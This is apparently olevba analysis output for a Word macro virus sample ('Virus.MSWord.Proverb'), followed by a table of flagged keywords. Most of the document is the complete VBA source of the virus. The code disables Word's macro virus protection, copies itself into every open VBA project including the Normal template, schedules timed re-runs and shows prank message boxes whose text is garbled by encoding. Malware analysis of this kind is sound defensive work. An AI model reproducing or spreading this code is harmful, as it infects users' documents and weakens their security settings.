olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Proverb-based-c23e9b5827bd310937d6da6449ee494a306dc35a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Proverb-based-c23e9b5827bd310937d6da6449ee494a306dc35a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_New()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            .InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ñ 1 Àï˝åëÿ Âàñ!", "Îïà?-Óãó!", "À âîò è ñåãîäíÿøíèé ï˝èêîë", "Word: ˙òî ÿ áóêâàëüíî òîëüêî ÷òî ï˝èäóìàë", "õå-õå", "Word: ˙òî ÿ â ¯óññêîì ˝àäèî óñëûøàë", "¯åêëàìíàÿ ñëóæáà Microsoft Word", "Word: Çàäîëáàëè ìåíÿ ˛òè ìàê˝îâè˝óñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ï˝èêîë ñåçîíà", "Word: Îé, ñåé÷àñ îïèñàˇñü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, "Ñ 1 Àï˝åëÿ Âàñ, " & Application.UserName & Space(100) & Assistant.Name, "Îïà?-Óãó!", "", "", "óì˝ó îò ñìåõà", "ï˝àâäà ñìåøíî", "À âîò è ñåãîäíÿøíèé ï˝èêîë", Assistant.Name & ": ˙òî ÿ áóêâàëüíî òîëüêî ÷òî ï˝èäóìàë", Assistant.Name & ": Îé, ñåé÷àñ îïèñàˇñü...", "õå-õå", Assistant.Name & ": ˙òî ÿ â ¯óññêîì ˝àäèî óñëûøàë", "¯åêëàìíàÿ ñëóæáà Microsoft Word", Assistant.Name & ": Çàäîëáàëè ìåíÿ ˛òè ìàê˝îâè˝óñû", "Âîò Âàì," & Application.UserName, "Ïîñëåäíèé ï˝èêîë ñåçîíà")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

